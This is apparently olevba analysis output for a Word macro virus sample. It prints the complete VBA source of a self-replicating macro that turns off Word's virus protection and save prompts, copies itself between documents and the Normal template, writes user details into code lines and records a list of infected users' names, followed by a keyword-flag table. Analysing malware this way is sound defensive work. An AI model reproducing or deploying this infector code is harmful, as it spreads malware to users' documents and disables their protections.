olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-b0a9c956070ea4b8b08e69a81fa56fcd1b663b5f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-b0a9c956070ea4b8b08e69a81fa56fcd1b663b5f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
On Error Resume Next
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Options.SaveNormalPrompt = 0
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Options.ConfirmConversions = 0
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Application.EnableCancelKey = 0
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Options.VirusProtection = 0
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
FP72 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
AL60 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If FP72 > 0 And AL60 > 0 Then GoTo RA52
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If FP72 = 0 Then
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Set TC3 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
UP39 = True
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
End If
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If AL60 = 0 Then
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Set TC3 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines, "' ****** " & Application.UserName & " was infected " & Now & vbCr
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
FP72 = FP72 + 2
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
LQ83 = True
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
End If
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If LQ83 <> True And UP39 <> True Then GoTo RA52
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If LQ83 = True Then TC3.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FP72 - 1))
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If UP39 = True Then TC3.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AL60 - 1))
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
With TC3.CodeModule
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
For x = 2 To (TC3.CodeModule.CountOfLines - 1) Step 2
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
Next x
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
End With
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If Month(Now) = Month(Now) And Day(Now) = Day(Now) Then MsgBox "" & Application.UserName & "BlackViruZ : tengo MacroViruZ que crear, antiviruz que evadir y documentos que matar"
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
RA52:
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
If AL60 <> 0 And FP72 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** PAPI  RIQUI was infected 08/12/1998 10:43:31 AM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Alfredo was infected 20/01/1999 00:39:09
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** HMHGHHH was infected 21/01/1999 05:07:41 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Computronic was infected 27/01/99 18:05:08
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** martin was infected 5/02/99 14:16:42
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Microsoft 95 version B. was infected 08/02/1999 10:42:36 AM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Microsoft 95 version B. was infected 09/02/1999 07:17:59 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Microsoft 95 version B. was infected 10/02/1999 08:27:36 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Prof. Wilmer was infected 20/02/99 07:11:03 a.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Prof. Carlos Bustamante was infected 20/02/99 04:34:08 p.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Wilmer was infected 23.02.99 11:19:19
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Wilmer was infected 25/02/99 10:09:37 p.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** ANA was infected 25/2/99 04:05:19 p.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Extensión Profesional was infected 2/25/99 7:46:23 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Marcelo was infected 02/03/99 08:04:12 a.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** WIN95 was infected 04/03/99 12:08:21 p.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** SERVICIO TECNICO was infected 10/03/99 12:13:59 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Compaq was infected 24/03/99 09:31:12 a.m.
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** XEROX AREQUIPA was infected 01/04/1999 08:19:50 AM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Alejandro Rozas was infected 6/4/99 9.12.26
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Claudia Bravo was infected 4/20/99 10:59:31 AM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Avert was infected 12/22/98 7:01:09 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Mike Pavluschick was infected 29.04.99 18:41:33
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
' ****** Tester was infected 2/23/01 5:04:01 PM
'TesterT0001309700013097.DOC2/23/01 5:04:01 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

